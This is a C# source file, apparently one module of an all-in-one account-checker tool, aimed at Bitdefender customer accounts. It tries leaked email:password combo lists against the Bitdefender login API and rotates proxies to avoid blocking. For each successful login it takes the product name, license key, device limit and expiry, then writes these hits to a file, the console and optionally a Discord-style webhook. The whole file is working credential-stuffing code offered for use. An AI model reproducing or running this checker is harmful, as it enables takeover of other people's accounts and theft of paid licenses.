using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Bitdefendermod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.UserAgent =
                                "Mozilla / 5.0(Windows NT 6.3; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 75.0.3770.142 Safari / 537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("referer", "https://my.bitdefender.com/login");
                            var text6 = req.Get("https://my.bitdefender.com/lv2/account?login=" + array[0] + "&pass=" +
                                                array[1] + "&action=login&type=userpass&fp=web").ToString();
                            if (text6.Contains("\"token\""))
                            {
                                var text7 = Parse(text6, "token\": \"", "\"");
                                req.ClearAllHeaders();
                                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                var source = req.Get("https://my.bitdefender.com/lv2/get_info?login=" + array[0] +
                                                     "&token=" + text7 + "&fields=serials%2Caccount").ToString();
                                var text8 = Parse(source, "\"product_name\": \"", "\"");
                                var text9 = Parse(source, "\"key\": \"", "\"");
                                var text10 = Parse(source, "max_computers\": ", ",");
                                var text11 = Parse(source, "expire_time\": ", ",");
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Bitdefender_hits",
                                    array[0] + ":" + array[1] + " | Product: " + text8 + " | License: " + text9 +
                                    " | Max Computers: " + text10 + " | Expires: " + text11);
                                if (Program.lorc == "LOG")
                                    Settings.PrintFree("Bit Defender",
                                        array[0] + ":" + array[1] + " | Product: " + text8 + " | License: " + text9 +
                                        " | Max Computers: " + text10 + " | Expires: " + text11);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(
                                        array[0] + ":" + array[1] + " | Product: " + text8 + " | License: " + text9 +
                                        " | Max Computers: " + text10 + " | Expires: " + text11, "BagelBoy Hits");
                            }
                            else if (text6.Contains("wrong_login"))
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                                req.Dispose();
                            }
                            else
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}